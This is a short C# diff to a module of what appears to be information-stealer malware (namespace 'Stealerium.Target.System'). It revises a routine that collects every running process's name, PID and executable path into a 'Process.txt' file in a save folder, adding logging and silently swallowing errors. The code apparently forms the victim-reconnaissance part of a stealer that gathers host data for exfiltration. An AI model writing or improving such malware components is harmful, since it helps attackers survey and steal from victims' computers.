@@ -1,4 +1,6 @@
-﻿using System.Diagnostics;
+﻿using Stealerium.Helpers;
+using System;
+using System.Diagnostics;
 using System.IO;
 using System.Management;
 
@@ -9,14 +11,22 @@ namespace Stealerium.Target.System
         // Save process list
         public static void WriteProcesses(string sSavePath)
         {
+            Logging.Log("Process List >>");
             foreach (var process in Process.GetProcesses())
-                File.AppendAllText(
-                    sSavePath + "\\Process.txt",
-                    "NAME: " + process.ProcessName +
-                    "\n\tPID: " + process.Id +
-                    "\n\tEXE: " + ProcessExecutablePath(process) +
-                    "\n\n"
-                );
+            {
+                try
+                {
+                    File.AppendAllText(
+                        sSavePath + "\\Process.txt",
+                        //$"{DateTime.Now.ToString("yyyy/MM/dd hh:mm:ss")} >> " + 
+                        $"NAME: {process.ProcessName } \n" +
+                        $"\tPID: {process.Id} \n" +
+                        $"\tEXE: {ProcessExecutablePath(process)}\n\n"
+                    );
+                }
+                catch { continue; }
+            }
+            Logging.Log("Process List Ended >>");
         }
 
         // Get process executable path
@@ -26,21 +36,7 @@ namespace Stealerium.Target.System
             {
                 if (process.MainModule != null) return process.MainModule.FileName;
             }
-            catch
-            {
-                var query = "SELECT ExecutablePath, ProcessID FROM Win32_Process";
-                var searcher = new ManagementObjectSearcher(query);
-
-                foreach (var o in searcher.Get())
-                {
-                    var item = (ManagementObject) o;
-                    var id = item["ProcessID"];
-                    var path = item["ExecutablePath"];
-
-                    if (path != null && id.ToString() == process.Id.ToString()) return path.ToString();
-                }
-            }
-
+            catch { }
             return "";
         }
     }
